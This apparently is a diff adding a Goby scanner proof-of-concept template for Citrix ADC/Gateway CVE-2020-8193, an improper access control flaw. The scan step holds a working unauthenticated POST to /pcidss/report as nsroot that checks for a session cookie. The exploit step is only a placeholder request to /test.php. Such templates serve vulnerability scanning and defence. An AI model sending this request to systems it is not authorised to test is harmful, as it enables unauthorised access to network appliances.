@@ -1,0 +1,104 @@
+{
+      "Name": "Citrix Unauthorized CVE-2020-8193",
+      "Level": "3",
+      "Tags": [
+            "Unauthorized"
+      ],
+      "GobyQuery": "(app=\"citrix-公司产品\" | title=\"Citrix Login\" | body=\"Citrix ADC\")",
+      "Description": "Improper access control in Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allows unauthenticated access to certain URL endpoints",
+      "Product": "citrix",
+      "Homepage": "https://www.citrix.com/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/xml",
+                              "X-NITRO-PASS": "{{{str1}}}",
+                              "X-NITRO-USER": "{{{str2}}}"
+                        },
+                        "data_type": "text",
+                        "data": "<appfwprofile><login></login></appfwprofile>",
+                        "set_variable": [
+                              "str2|rand|str|8",
+                              "str1|rand|str|8"
+                        ]
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "406",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$head",
+                                    "operation": "contains",
+                                    "value": "SESSID=",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-06 14:18:50",
+      "GobyVersion": "1.8.302"
+}
